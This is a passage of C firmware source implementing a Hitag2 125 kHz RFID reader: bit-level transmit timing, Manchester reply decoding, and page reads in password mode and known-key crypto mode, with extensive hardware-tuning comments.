#include "lf_hitag2_data.h"

#include <string.h>

#include "app_status.h"
#include "app_timer.h"
#include "bsp_delay.h"
#include "bsp_time.h"
#include "bsp_wdt.h"
#include "circular_buffer.h"
#include "hitag2_crypto.h"
#include "lf_125khz_radio.h"
#include "lf_reader_data.h"
#include "nrf_soc.h"
#include "timeslot.h"

#include "lf_ia_codec.h"

#define NRF_LOG_MODULE_NAME lf_hitag2
#include "nrf_log.h"
#include "nrf_log_ctrl.h"
#include "nrf_log_default_backends.h"
NRF_LOG_MODULE_REGISTER();

/* -----------------------------------------------------------------------
 * Protocol constants, verified against RfidResearchGroup/proxmark3
 * (armsrc/hitag2.c, include/protocols.h) -- see header comment.
 * All *_TC constants are in carrier periods (Tc = 1/125000 s = 8 us).
 * --------------------------------------------------------------------- */

/* HITAG2_START_AUTH/READ_PAGE/READ_PAGE_INV/WRITE_PAGE moved to
 * lf_hitag2_data.h -- hitag2_tag.c (tag emulation) needs them too. */

#define HITAG2_T_LOW_TC    6    /* field-off pulse per bit, 4..10 Tc range */
#define HITAG2_T_0_TC      20   /* total bit-0 duration, 18..22 Tc range */
#define HITAG2_T_1_TC      30   /* total bit-1 duration, 26..32 Tc range */
#define HITAG2_T_STOP_TC   36   /* EOF stop condition after the last bit, T_EOF should be > 36 Tc */

#define HITAG2_T_WAIT_POWERUP_TC        313  /* tag internal powerup, 312.5 Tc */
#define HITAG2_T_WAIT_START_AUTH_MAX_TC 232  /* tag gives up waiting for START_AUTH after this */
#define HITAG2_T_WAIT_RESP_TC           227  /* measured: tag's first answer edge, from reader's last edge */
#define HITAG2_T_WAIT_2_TC              90   /* min quiet time after a reply before the next command */

/* Reply (tag -> reader): RF/32 Manchester, 32 Tc per bit, matching
 * lf_ia_hitag2.c's HT2_BIT_FC on the emulation side. */
#define HITAG2_BIT_FC   32u

/* Every reply starts with five 1 bits (start of frame) before the data. */
#define HITAG2_SOF_BITS 5u

/* Tc from the end of TX (g_tx_done_tick) to the reply's first rising edge,
 * as seen through LF_OA_OUT. Measured on real hardware against CU's own
 * emulator (second SOF edge ~246 Tc after TX). Only has to be right to
 * +-16 Tc (half a bit). */
#define HITAG2_REPLY_START_TC   214u

#define HITAG2_REPLY_WAIT_TC     1000u /* give up if no reply edge by then (8 ms) */
#define HITAG2_MIN_HIGH_TC       5u
#define HITAG2_TWO_UNIT_HIGH_TC  17u  /* measured: one unit 8-16 Tc, two units 17-28 */
#define HITAG2_IDLE_TC           110u /* no edge for this long: frame over */
#define HITAG2_CB_SIZE           64

static circular_buffer g_cb;
static volatile uint16_t g_last_cnt;

/* One run (level + length in Tc) per LF_OA_OUT edge; needs
 * lf_125khz_radio_gpiote_enable(true). The level is the run that just
 * ended: a rising edge ends a low run. Lengths are differences of the
 * free-running carrier counter -- clearing it per edge drops the counts
 * that land between capture and clear (~1.4% short on real hardware). */
static void hitag2_edge_cb(void) {
    uint16_t now = (uint16_t)get_lf_counter_value();
    uint16_t len = (uint16_t)(now - g_last_cnt);
    g_last_cnt = now;
    if (len > LF_IA_RUN_LEN_MAX) {
        len = LF_IA_RUN_LEN_MAX;
    }
    uint16_t run = LF_IA_RUN(!lf_125khz_radio_last_edge_was_rising(), len);
    cb_push_back(&g_cb, &run);
}

static void hitag2_rx_arm(bool both_edges) {
    cb_init(&g_cb, HITAG2_CB_SIZE, sizeof(uint16_t));
    register_rio_callback(hitag2_edge_cb);
    lf_125khz_radio_gpiote_enable(both_edges);
    g_last_cnt = 0;
    clear_lf_counter_value();
}

/* Each BPLM bit toggles stop/start_lf_125khz_radio(), and that PWM driver
 * makes its own HFCLK request/release around each toggle -- so across a
 * whole TX burst it churns the SoftDevice's HFCLK reference count to zero
 * and back repeatedly, never letting the crystal (HFXO startup is ~0.36ms,
 * longer than the gap between toggles) actually settle. Confirmed on real
 * hardware: sd_clock_hfclk_is_running() read false during TX every time.
 *
 * Fix is the same one lf_xtal_counter.c already uses for TIMER1: hold our
 * own HFCLK request for the whole field session. The SoftDevice reference-
 * counts requests, so our hold keeps the crystal up regardless of how often
 * the PWM driver's own request/release toggles underneath it. */
static void hitag2_hfclk_hold(void) {
    sd_clock_hfclk_request();
    uint32_t running = 0;
    while (!running) {
        sd_clock_hfclk_is_running(&running);
    }
}

static void hitag2_hfclk_release(void) {
    sd_clock_hfclk_release();
}

/* -----------------------------------------------------------------------
 * Transmit side (reader -> tag), Binary Pulse Length Modulation.
 *
 * Per bit: drop the field for T_LOW, restore it, then hold it for the
 * remainder of the bit period (T_0 or T_1 minus T_LOW). This is the exact
 * sequence of armsrc/hitag2.c's hitag2_reader_send_bit(), just expressed
 * with this codebase's stop/start_lf_125khz_radio() primitives (the same
 * primitives lf_em4x05_data.c's send_em4305_bit() uses for its own gap
 * encoding).
 * --------------------------------------------------------------------- */

static void hitag2_send_bit(bool bit) {
    stop_lf_125khz_radio();
    bsp_delay_us(HITAG2_T_LOW_TC * 8);
    start_lf_125khz_radio();
    if (bit) {
        bsp_delay_us((HITAG2_T_1_TC - HITAG2_T_LOW_TC) * 8);
    } else {
        bsp_delay_us((HITAG2_T_0_TC - HITAG2_T_LOW_TC) * 8);
    }
}

/* EOF: one more T_LOW drop, then hold the field through T_STOP. Same shape
 * as hitag2_send_bit(), just with a fixed stop-condition hold instead of a
 * data-dependent one -- matches armsrc/hitag2.c's hitag2_reader_send_frame()
 * exactly, which every frame sender there appends after its bit loop.
 *
 * Without this, a gap-interval receiver (this codebase's own tag-emulation
 * engine, lf_ia_engine.c) has no edge to measure the last bit's duration
 * against and silently drops it -- confirmed on real hardware: a 5-bit
 * START_AUTH decoded as 4 bits by CU's own emulator reading CU's own
 * reader. A receiver with a fixed decode window (a real tag's analog
 * front end) may equally rely on this EOF to recognize the command is
 * complete rather than still waiting for more bits. */
static void hitag2_send_eof(void) {
    stop_lf_125khz_radio();
    bsp_delay_us(HITAG2_T_LOW_TC * 8);
    start_lf_125khz_radio();
    bsp_delay_us(HITAG2_T_STOP_TC * 8);
}

/* Sends the low `nbits` bits of `value`, MSB first, followed by the EOF. */
static void hitag2_send_bits(uint32_t value, uint8_t nbits) {
    for (int8_t i = (int8_t)(nbits - 1); i >= 0; i--) {
        hitag2_send_bit((value >> i) & 1);
    }
    hitag2_send_eof();
}

/* Sends `nbits` bits from a byte array, MSB first, followed by the EOF --
 * same framing as hitag2_send_bits, just for frames wider than 32 bits (the
 * 64-bit Nr/Ar crypto-mode challenge). Bit i is bit (7 - i%8) of byte i/8,
 * matching how hitag2_receive_frame packs a received frame. */
static void hitag2_send_bits_bytes(const uint8_t *bytes, uint8_t nbits) {
    for (uint8_t i = 0; i < nbits; i++) {
        hitag2_send_bit((bytes[i / 8] >> (7 - (i % 8))) & 1);
    }
    hitag2_send_eof();
}

static uint32_t le32(const uint8_t *p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

/* 10-bit READ_PAGE/WRITE_PAGE/READ_PAGE_INVERTED frame.
 *
 * tx0 = opcode | (page << 3) | (complement >> 2), where complement = page ^ 7
 * (3 bits); the remaining 2 low bits of complement are the frame's last 2
 * bits. Derived from -- and verified bit-for-bit self-consistent with --
 * armsrc/hitag2.c's own sector decode:
 *   sector = ~(((rx[0]<<2)&0x04) | ((rx[1]>>6)&0x03)) & 0x07
 * and its own command encode:
 *   tx[0] = OPCODE | (blocknr << 3) | ((blocknr ^ 7) >> 2)
 */
static uint16_t hitag2_page_frame(uint8_t opcode, uint8_t page) {
    uint8_t page3 = page & 0x7;
    uint8_t comp  = (page3 ^ 0x7) & 0x7;
    uint8_t tx0   = opcode | (page3 << 3) | (comp >> 2);
    return ((uint16_t)tx0 << 2) | (comp & 0x3);
}

/* -----------------------------------------------------------------------
 * Receive side (tag -> reader): five SOF 1 bits, then `nbits` data bits,
 * RF/32 Manchester (1 = load then no load, 0 = the reverse).
 *
 * Decoded from rising edges only. Measured on real hardware (lf hitag2 raw
 * -b against a tag PM3 reads fine): rising edges sit within a few Tc of
 * nominal, falling edges move by up to half a unit with the preceding
 * pattern, and a single high half-bit that follows a two-unit high and a
 * one-unit low sometimes never crosses the comparator at all. Run-by-run
 * Manchester (lf_ia_decode_runs()) breaks on both; rising-to-rising
 * intervals only see the second, as one 2.5T/3T interval.
 *
 * A rising edge is either the start of a 1 that follows a 1 (state B) or
 * the middle of a 0 (state M). From there:
 *   B: 1T -> 1          1.5T -> 0 (M)
 *   M: 1T -> 0          1.5T -> 1,1 (B)        2T -> 1,0
 *      2.5T -> 1,1,1 (B)   3T -> 1,1,0         lost edge: 1.5T + the rest
 * A lost edge inside a run of equal bits gives the same intervals (2T in
 * B is 1,1; in M 2T/3T can be 0,0 / 0,0,0); see short_high below.
 * A 1 after a 0 has no rising edge of its own, so in M anything that is
 * not 1T (including the frame simply ending) means the next bit is 1.
 *
 * RX may arm after the reply has begun, so how many SOF bits are left is
 * worked out from when the first edge lands relative to the end of TX.
 * --------------------------------------------------------------------- */

/* app_timer tick (RTC1, APP_TIMER_CONFIG_RTC_FREQUENCY=1 -> 16384 Hz, ~61us/tick)
 * at the instant the last TX bit's edge finishes, for measuring the gap to
 * when RX arms and the reply's first edge lands. */
static volatile uint32_t g_tx_done_tick;

#define HITAG2_RX_MAX_BITS  (HITAG2_SOF_BITS + 64u + 3u)

static bool hitag2_receive_frame(uint8_t *out, uint8_t nbits, uint32_t timeout_ms) {
    hitag2_rx_arm(true);
    uint32_t arm_tc = (((app_timer_cnt_get() - g_tx_done_tick) & 0xFFFFFFu) * 61u) / 8u;

    uint8_t s[(HITAG2_RX_MAX_BITS + 7) / 8] = {0};
    uint8_t n = 0;
    uint8_t sof = HITAG2_SOF_BITS;  /* SOF bits expected in s[] */
    uint32_t first_tc = arm_tc;     /* end of TX -> first rising edge */
    uint32_t acc = 0;               /* Tc since the last accepted rising edge */
    uint32_t rise_acc = 0;          /* acc at a rising edge not yet accepted */
    uint32_t last_high = 0;         /* high run that followed the last accepted edge */
    int32_t carry = 0;              /* half the last edge's timing error */
    bool started = false;
    bool in_m = false;
    bool done = false;

#define HITAG2_EMIT(b)                         \
    do {                                       \
        if (n < HITAG2_RX_MAX_BITS) {          \
            lf_ia_bit_put(s, n, (b));          \
            n++;                               \
        }                                      \
    } while (0)

    autotimer *p_at = bsp_obtain_timer(0);
    while (!done && NO_TIMEOUT_1MS(p_at, timeout_ms)) {
        uint16_t run = 0;
        if (!cb_pop_front(&g_cb, &run)) {
            if (!started && (uint16_t)get_lf_counter_value() > HITAG2_REPLY_WAIT_TC) {
                done = true;  /* nothing came: don't sit out the whole timeout */
            }
            /* Signed: an edge between the two reads makes this negative. */
            if (started && (int16_t)((uint16_t)get_lf_counter_value() - g_last_cnt) > (int16_t)HITAG2_IDLE_TC) {
                if (in_m) {
                    HITAG2_EMIT(1);
                }
                done = true;
            }
            continue;
        }
        /* A rising edge only counts once its high run has lasted
         * HITAG2_MIN_HIGH_TC: idle comparator noise is 1-2 Tc pulses, the
         * weakest real half-bit seen is 8. */
        if (!LF_IA_RUN_IS_LOAD(run)) {
            rise_acc = acc + LF_IA_RUN_LEN(run);
            acc = rise_acc;
            continue;
        }
        acc += LF_IA_RUN_LEN(run);
        if (rise_acc == 0 || LF_IA_RUN_LEN(run) < HITAG2_MIN_HIGH_TC) {
            rise_acc = 0;
            continue;
        }
        uint32_t high = LF_IA_RUN_LEN(run);
        acc = rise_acc;
        rise_acc = 0;

        if (!started) {
            first_tc += acc;
            acc = high;
            if (first_tc + HITAG2_BIT_FC / 2 < HITAG2_REPLY_START_TC) {
                continue;  /* too early to be the reply: idle noise */
            }
            uint32_t missed = (first_tc + HITAG2_BIT_FC / 2 > HITAG2_REPLY_START_TC)
                              ? (first_tc + HITAG2_BIT_FC / 2 - HITAG2_REPLY_START_TC) / HITAG2_BIT_FC : 0;
            sof = (missed >= HITAG2_SOF_BITS) ? 0 : (uint8_t)(HITAG2_SOF_BITS - missed);
            started = true;
            last_high = high;
            HITAG2_EMIT(1);
            continue;
        }

        int32_t adj = (int32_t)acc + carry;
        if (adj < 20) {
            acc += high;
            continue;  /* too close to the last edge: fold into the next interval */
        }
        uint32_t whole = acc;
        acc = high;
        /* A lost edge leaves the same interval as real data; the high run
         * before it tells them apart: one unit means the missing pulse was
         * a plain repeat of the last bit, two units is the pattern above. */
        bool short_high = last_high < HITAG2_TWO_UNIT_HIGH_TC;
        last_high = high;

        /* Nominal interval in half-bits (2 = 1T ... 6 = 3T), 0 = none. */
        uint8_t hb = (adj < 40) ? 2 : (adj < 56) ? 3 : (adj < 72) ? 4 : (adj < 88) ? 5 : (adj <= 104) ? 6 : 0;

        if (!in_m) {
            if (hb == 2) {
                HITAG2_EMIT(1);
            } else if (hb == 4 && n > 1) {
                HITAG2_EMIT(1);  /* 1,1 with the edge between them lost */
                HITAG2_EMIT(1);
            } else if (hb == 5 && n > 1) {
                /* 1,0 with the 1's edge lost. 0,0 with the first 0's edge
                 * lost measures the same; that pulse follows a two-unit
                 * low, and those have not been seen to drop. */
                HITAG2_EMIT(1);
                HITAG2_EMIT(0);
                in_m = true;
            } else if (hb == 3) {
                HITAG2_EMIT(0);
                in_m = true;
            } else if (n == 1) {
                /* The "first edge" was a stray one; restart from this one. */
                first_tc += whole;
                uint32_t missed = (first_tc + HITAG2_BIT_FC / 2 > HITAG2_REPLY_START_TC)
                                  ? (first_tc + HITAG2_BIT_FC / 2 - HITAG2_REPLY_START_TC) / HITAG2_BIT_FC : 0;
                sof = (missed >= HITAG2_SOF_BITS) ? 0 : (uint8_t)(HITAG2_SOF_BITS - missed);
                carry = 0;
                continue;  /* last_high already holds this edge's high run */
            } else {
                done = true;
            }
        } else {
            switch (hb) {
                case 2:
                    HITAG2_EMIT(0);
                    break;
                case 3:
                    HITAG2_EMIT(1);
                    HITAG2_EMIT(1);
                    in_m = false;
                    break;
                case 4:
                    HITAG2_EMIT(short_high ? 0 : 1);  /* 0,0 or 1,0 */
                    HITAG2_EMIT(0);
                    break;
                case 5:
                    HITAG2_EMIT(short_high ? 0 : 1);  /* 0,1,1 or 1,1,1 */
                    HITAG2_EMIT(1);
                    HITAG2_EMIT(1);
                    in_m = false;
                    break;
                case 6:
                    HITAG2_EMIT(short_high ? 0 : 1);  /* 0,0,0 or 1,1,0 */
                    HITAG2_EMIT(short_high ? 0 : 1);
                    HITAG2_EMIT(0);
                    break;
                default:
                    HITAG2_EMIT(1);
                    done = true;
                    break;
            }
        }
        if (hb != 0) {
            carry = (adj - (int32_t)hb * 16) / 2;
        }
        if (n >= sof + nbits) {
            done = true;
        }
    }
#undef HITAG2_EMIT
    bsp_return_timer(p_at);
    lf_125khz_radio_gpiote_disable();
    unregister_rio_callback();
    cb_free(&g_cb);

    /* The SOF can't be longer than the run of 1s actually seen. */
    uint8_t ones = 0;
    while (ones < n && lf_ia_bit_get(s, ones)) {
        ones++;
    }
    if (sof > ones) {
        sof = ones;
    }
    if (n < sof + nbits) {
        return false;
    }
    memset(out, 0, (size_t)(nbits + 7) / 8);
    for (uint8_t i = 0; i < nbits; i++) {
        lf_ia_bit_put(out, i, lf_ia_bit_get(s, sof + i));
    }
    /* The tag wants quiet before the next command (T_WAIT_2); decoding can
     * finish on the frame's very last edge. */
    bsp_delay_us(HITAG2_T_WAIT_2_TC * 8);
    return true;
}

/* -----------------------------------------------------------------------
 * Command helpers -- each is one request_timeslot() transmit followed by
 * one receive window, mirroring lf_em4x05_data.c's per-command structure.
 * --------------------------------------------------------------------- */

/* Timeslot length for one TX frame. request_timeslot() only returns once
 * the slot has run out (sd_radio_session_close() waits for it), and RX
 * cannot arm before that -- so every microsecond of slot past the end of
 * TX is reply lost. Sized to worst-case bit time this cost ~1.9 ms after
 * START_AUTH (one SOF bit gone) and ~4 ms after an all-zero password (ten
 * bits gone, seen on real hardware); the reply starts ~1.65 ms after TX.
 * So: the frame's actual length, plus the measured ~7 us/symbol of PWM
 * stop/start overhead with headroom. Overstaying a slot is fatal, hence
 * headroom rather than none. */
static uint32_t hitag2_slot_us(uint8_t nbits, uint32_t ones) {
    uint32_t tx_tc = ones * HITAG2_T_1_TC + (nbits - ones) * HITAG2_T_0_TC +
                     HITAG2_T_LOW_TC + HITAG2_T_STOP_TC;
    return tx_tc * 8u + 700u + 12u * (nbits + 1u);
}

static uint32_t g_send_value;
static uint8_t  g_send_nbits;
static volatile bool g_timeslot_done = false;

/* request_timeslot()'s configure_next_event_earliest() (timeslot.c) asks for
 * NRF_RADIO_HFCLK_CFG_NO_GUARANTEE, so the SoftDevice may still be on the RC
 * oscillator when the callback runs -- it only promises the crystal for
 * NRF_RADIO_HFCLK_CFG_XTAL_GUARANTEED. Latched right before the PWM bit-bang
 * so hitag2_reader_raw_capture() can report whether the crystal was actually
 * up for this particular TX burst. */
static volatile bool g_hfclk_running_at_tx;

static void hitag2_send_timeslot_cb(void) {
    uint32_t hfclk_running = 0;
    sd_clock_hfclk_is_running(&hfclk_running);
    g_hfclk_running_at_tx = (hfclk_running != 0);
    hitag2_send_bits(g_send_value, g_send_nbits);
    g_tx_done_tick = app_timer_cnt_get();
    g_timeslot_done = true;
}

static bool hitag2_tx_rx(uint32_t tx_value, uint8_t tx_nbits,
                          uint8_t *rx_out, uint8_t rx_nbits,
                          uint32_t powerup_wait_us, uint32_t timeout_ms) {
    g_send_value    = tx_value;
    g_send_nbits    = tx_nbits;
    g_timeslot_done = false;

    uint32_t ones = 0;
    for (uint8_t i = 0; i < tx_nbits; i++) {
        ones += (tx_value >> i) & 1u;
    }
    request_timeslot(powerup_wait_us + hitag2_slot_us(tx_nbits, ones), hitag2_send_timeslot_cb);

    autotimer *p_wait = bsp_obtain_timer(0);
    while (!g_timeslot_done && NO_TIMEOUT_1MS(p_wait, 20)) {}
    bsp_return_timer(p_wait);

    if (!g_timeslot_done) {
        return false;
    }
    return hitag2_receive_frame(rx_out, rx_nbits, timeout_ms);
}

/* Byte-buffer send path, additive alongside hitag2_tx_rx above: only the
 * 64-bit Nr/Ar crypto challenge needs more than 32 bits, and the existing
 * uint32-based path (hardware-verified for password mode) is left alone. */
static uint8_t g_send8_buf[8];
static uint8_t g_send8_nbits;

static void hitag2_send8_timeslot_cb(void) {
    hitag2_send_bits_bytes(g_send8_buf, g_send8_nbits);
    g_tx_done_tick = app_timer_cnt_get();
    g_timeslot_done = true;
}

static bool hitag2_tx_rx_bytes(const uint8_t *tx_bytes, uint8_t tx_nbits,
                                uint8_t *rx_out, uint8_t rx_nbits,
                                uint32_t powerup_wait_us, uint32_t timeout_ms) {
    memcpy(g_send8_buf, tx_bytes, (size_t)(tx_nbits + 7) / 8);
    g_send8_nbits   = tx_nbits;
    g_timeslot_done = false;

    uint32_t ones = 0;
    for (uint8_t i = 0; i < tx_nbits; i++) {
        ones += (tx_bytes[i / 8] >> (7 - (i % 8))) & 1u;
    }
    request_timeslot(powerup_wait_us + hitag2_slot_us(tx_nbits, ones), hitag2_send8_timeslot_cb);

    autotimer *p_wait = bsp_obtain_timer(0);
    while (!g_timeslot_done && NO_TIMEOUT_1MS(p_wait, 20)) {}
    bsp_return_timer(p_wait);

    if (!g_timeslot_done) {
        return false;
    }
    return hitag2_receive_frame(rx_out, rx_nbits, timeout_ms);
}

/* Debug aid: send START_AUTH and dump the raw GPIOTE edge intervals on
 * LF_OA_OUT in place of decoding them -- for seeing what the comparator
 * actually produces on real silicon.
 *
 * both_edges selects the same capture hitag2_receive_frame() uses (every
 * run, with its load level packed into bit 7 and its length, clamped to
 * 0x7F Tc, in bits 6..0) instead of the original rising-only dump (bit 7
 * always 0, length truncated mod 256) -- so hitag2_receive_frame()'s own
 * decode input can be inspected directly instead of guessed at from a
 * rising-only proxy.
 *
 * Also reports rx_arm_gap_ticks: the app_timer (RTC1, ~61us/tick) gap
 * between the last TX edge finishing (timestamped inside the timeslot
 * callback) and RX actually arming here, after request_timeslot() has torn
 * its SD radio session down. Hitag2's reply window is only ~199-206 T0
 * (~1.6-1.65ms) after the reader's last edge -- unlike EM4x05/T55xx, whose
 * much longer windows this TX-then-arm structure was proven against -- so if
 * that teardown alone is in the same ballpark, RX would arm after the tag
 * has already answered and nothing would ever be seen.
 *
 * Also reports hfclk_running_out: whether the crystal (not the RC
 * oscillator) was the HFCLK source at the instant the TX burst ran, per
 * NRF_RADIO_HFCLK_CFG_NO_GUARANTEE above -- a false here means the bit
 * timing just sent was off nominal 16 MHz by whatever the RC oscillator's
 * tolerance is, not the values the classifier and the tag both expect. */
bool hitag2_reader_raw_capture(uint8_t *intervals, uint8_t max_n, uint8_t *n_out,
                                uint32_t *rx_arm_gap_ticks_out, bool *hfclk_running_out,
                                bool both_edges, uint32_t timeout_ms) {
    *n_out = 0;
    *rx_arm_gap_ticks_out = 0;
    *hfclk_running_out = false;
    hitag2_hfclk_hold();
    start_lf_125khz_radio();
    bsp_delay_us(HITAG2_T_WAIT_POWERUP_TC * 8);

    g_send_value    = 0x18;  /* START_AUTH, 5 bits -- see hitag2_reader_get_uid */
    g_send_nbits    = 5;
    g_timeslot_done = false;
    request_timeslot(hitag2_slot_us(5, 2), hitag2_send_timeslot_cb);

    autotimer *p_wait = bsp_obtain_timer(0);
    while (!g_timeslot_done && NO_TIMEOUT_1MS(p_wait, 20)) {}
    bsp_return_timer(p_wait);

    if (!g_timeslot_done) {
        stop_lf_125khz_radio();
        hitag2_hfclk_release();
        return false;
    }

    *hfclk_running_out = g_hfclk_running_at_tx;
    uint32_t rx_arm_tick_pre = app_timer_cnt_get();
    hitag2_rx_arm(both_edges);
    *rx_arm_gap_ticks_out = (rx_arm_tick_pre - g_tx_done_tick) & 0xFFFFFFu;

    uint8_t n = 0;
    autotimer *p_at = bsp_obtain_timer(0);
    while (n < max_n && NO_TIMEOUT_1MS(p_at, timeout_ms)) {
        uint16_t run = 0;
        if (!cb_pop_front(&g_cb, &run)) {
            continue;
        }
        if (both_edges) {
            uint16_t len = LF_IA_RUN_LEN(run);
            intervals[n++] = (uint8_t)((LF_IA_RUN_IS_LOAD(run) ? 0x80 : 0) |
                                        (len > 0x7F ? 0x7F : len));
        } else {
            /* Rising-only: the level bit is always 0, so this is the
             * rising-to-rising interval, truncated mod 256. */
            intervals[n++] = (uint8_t)run;
        }
    }
    bsp_return_timer(p_at);
    lf_125khz_radio_gpiote_disable();
    unregister_rio_callback();
    cb_free(&g_cb);

    stop_lf_125khz_radio();
    hitag2_hfclk_release();
    *n_out = n;
    return n > 0;
}

bool hitag2_reader_get_uid(uint8_t uid[HITAG2_PAGE_SIZE], uint32_t timeout_ms) {
    /* START_AUTH is 5 bits, top-aligned in the frame: value 0x18 (binary
     * 11000) sent as the low 5 bits -- see HITAG2_START_AUTH's own comment
     * in protocols.h ("left 5 bits only"); hitag2_send_bits sends the low
     * `nbits` bits MSB-first, so passing 0x18/5 here reproduces "11000". */
    hitag2_hfclk_hold();
    start_lf_125khz_radio();
    bsp_delay_us(HITAG2_T_WAIT_POWERUP_TC * 8);
    bool ok = hitag2_tx_rx(0x18, 5, uid, 32, 0, timeout_ms);
    return ok;
}

static uint8_t hitag2_read_session(const uint8_t password[HITAG2_PAGE_SIZE],
                         uint8_t pages[HITAG2_NUM_PAGES][HITAG2_PAGE_SIZE],
                         uint32_t timeout_ms) {
    memset(pages, 0, HITAG2_NUM_PAGES * HITAG2_PAGE_SIZE);

    /* hitag2_reader_get_uid() turns the field on unconditionally; this
     * function owns the field for the whole session and must turn it back
     * off on every exit (matches lf_em4x05_data.c's own reader functions --
     * leaving the field on across a failed attempt denies the tag the fresh
     * power-up its next START_AUTH needs). */
    if (!hitag2_reader_get_uid(pages[HITAG2_PAGE_UID], timeout_ms)) {
        stop_lf_125khz_radio();
        hitag2_hfclk_release();
        return HITAG2_FAIL_UID;
    }

    uint32_t pwd_val = ((uint32_t)password[0] << 24) | ((uint32_t)password[1] << 16) |
                        ((uint32_t)password[2] << 8)  | (uint32_t)password[3];
    uint8_t reply[4];
    if (!hitag2_tx_rx(pwd_val, 32, reply, 32, 0, timeout_ms)) {
        /* Tag may have ignored this (wrong password, or crypto mode) --
         * either way there is nothing more we can read without the key. */
        stop_lf_125khz_radio();
        hitag2_hfclk_release();
        return HITAG2_FAIL_AUTH;
    }
    memcpy(pages[HITAG2_PAGE_CONFIG], reply, 4);
    memcpy(pages[HITAG2_PAGE_PWD], password, 4);

    static const uint8_t remaining_pages[] = {2, 4, 5, 6, 7};
    for (size_t i = 0; i < sizeof(remaining_pages); i++) {
        uint8_t page = remaining_pages[i];
        uint16_t frame = hitag2_page_frame(HITAG2_READ_PAGE, page);
        uint8_t out[4];
        if (!hitag2_tx_rx(frame, 10, out, 32, 0, timeout_ms)) {
            stop_lf_125khz_radio();
            hitag2_hfclk_release();
            return HITAG2_FAIL_PAGE;
        }
        memcpy(pages[page], out, 4);
    }
    stop_lf_125khz_radio();
    hitag2_hfclk_release();
    return HITAG2_FAIL_NONE;
}

static uint8_t hitag2_crypto_read_session(const uint8_t key[HITAG2_KEY_SIZE],
                                uint8_t pages[HITAG2_NUM_PAGES][HITAG2_PAGE_SIZE],
                                uint32_t timeout_ms) {
    memset(pages, 0, HITAG2_NUM_PAGES * HITAG2_PAGE_SIZE);

    /* Field lifecycle is owned here, same reasoning as hitag2_reader_read(). */
    if (!hitag2_reader_get_uid(pages[HITAG2_PAGE_UID], timeout_ms)) {
        stop_lf_125khz_radio();
        hitag2_hfclk_release();
        return HITAG2_FAIL_UID;
    }

    /* Key and UID are plain little-endian decodes of the raw bytes, then bit-reversed per byte (hitag2_rev64/32) --
     * matches RfidResearchGroup/proxmark3's hitag2_crypto() reader function exactly. IV fixed to 0: Nr freshness
     * only matters to an attacker, not to this legitimate known-key read. */
    uint64_t key_raw = (uint64_t)key[0] | ((uint64_t)key[1] << 8) | ((uint64_t)key[2] << 16) |
                        ((uint64_t)key[3] << 24) | ((uint64_t)key[4] << 32) | ((uint64_t)key[5] << 40);
    uint64_t cs = hitag2_crypto_init(hitag2_rev64(key_raw), hitag2_rev32(le32(pages[HITAG2_PAGE_UID])), 0);

    uint8_t nrar[8];
    memset(nrar, 0x00, 4);           /* Nr */
    memset(nrar + 4, 0xFF, 4);
    hitag2_crypto_build_auth(&cs, nrar + 4);  /* Ar = inverted keystream, consumes 32 bits */

    uint8_t reply[4];
    if (!hitag2_tx_rx_bytes(nrar, 64, reply, 32, 0, timeout_ms)) {
        /* No answer: wrong key, or the tag is actually in password mode. */
        stop_lf_125khz_radio();
        hitag2_hfclk_release();
        return HITAG2_FAIL_AUTH;
    }
    hitag2_crypto_transcrypt(&cs, reply, 4, 0);
    memcpy(pages[HITAG2_PAGE_CONFIG], reply, 4);  /* already have page 3 -- skip re-reading it below */

    static const uint8_t remaining_pages[] = {1, 2, 4, 5, 6, 7};
    for (size_t i = 0; i < sizeof(remaining_pages); i++) {
        uint8_t page = remaining_pages[i];
        uint16_t frame = hitag2_page_frame(HITAG2_READ_PAGE, page);
        /* Every frame is encrypted once crypto mode is active, the command as much as the reply: pack the 10-bit
         * frame into bytes the same way a received frame would be, XOR it with the next keystream bits (1 byte +
         * 2 bits, matching the frame's own 10/8 split), then send the result. */
        uint8_t fb[2] = { (uint8_t)(frame >> 2), (uint8_t)((frame & 0x3u) << 6) };
        hitag2_crypto_transcrypt(&cs, fb, 1, 2);
        uint32_t enc_value = ((uint32_t)fb[0] << 2) | (fb[1] >> 6);

        uint8_t out[4];
        if (!hitag2_tx_rx(enc_value, 10, out, 32, 0, timeout_ms)) {
            stop_lf_125khz_radio();
            hitag2_hfclk_release();
            return HITAG2_FAIL_PAGE;
        }
        hitag2_crypto_transcrypt(&cs, out, 4, 0);
        memcpy(pages[page], out, 4);
    }
    stop_lf_125khz_radio();
    hitag2_hfclk_release();
    return HITAG2_FAIL_NONE;
}

/* The link is marginal in both directions on real hardware (the tag does
 * not always answer START_AUTH, and the comparator can drop reply pulses),
 * and Hitag2 replies carry no checksum: a misread bit is otherwise silent
 * (seen: one page off by two bits in an otherwise good crypto read). So a
 * session is repeated from a fresh power-up until one returns the same
 * eight pages as any earlier one (the last HITAG2_KEEP are kept). */
#define HITAG2_SESSION_ATTEMPTS  12
#define HITAG2_FIELD_OFF_MS      10
#define HITAG2_KEEP              4

static uint8_t g_fail_stage;
static uint8_t g_attempts;

void hitag2_reader_last_result(uint8_t *fail_stage, uint8_t *attempts) {
    *fail_stage = g_fail_stage;
    *attempts = g_attempts;
}

typedef uint8_t (*hitag2_session_t)(const uint8_t *secret,
                                    uint8_t pages[HITAG2_NUM_PAGES][HITAG2_PAGE_SIZE],
                                    uint32_t timeout_ms);

static bool hitag2_read_verified(hitag2_session_t session, const uint8_t *secret,
                                 uint8_t pages[HITAG2_NUM_PAGES][HITAG2_PAGE_SIZE],
                                 uint32_t timeout_ms) {
    uint8_t prev[HITAG2_KEEP][HITAG2_NUM_PAGES][HITAG2_PAGE_SIZE];
    uint8_t seen_uid[HITAG2_PAGE_SIZE] = {0};
    uint8_t n_prev = 0;

    g_fail_stage = HITAG2_FAIL_NONE;
    for (g_attempts = 1; g_attempts <= HITAG2_SESSION_ATTEMPTS; g_attempts++) {
        bsp_wdt_feed();  /* a silent tag times out each attempt; 12 can exceed the 5 s watchdog */
        uint8_t stage = session(secret, pages, timeout_ms);
        if (stage == HITAG2_FAIL_NONE) {
            for (uint8_t i = 0; i < n_prev && i < HITAG2_KEEP; i++) {
                if (memcmp(prev[i], pages, sizeof(prev[i])) == 0) {
                    g_fail_stage = HITAG2_FAIL_NONE;
                    return true;
                }
            }
            memcpy(prev[n_prev % HITAG2_KEEP], pages, sizeof(prev[0]));
            n_prev++;
            stage = HITAG2_FAIL_VERIFY;
        }
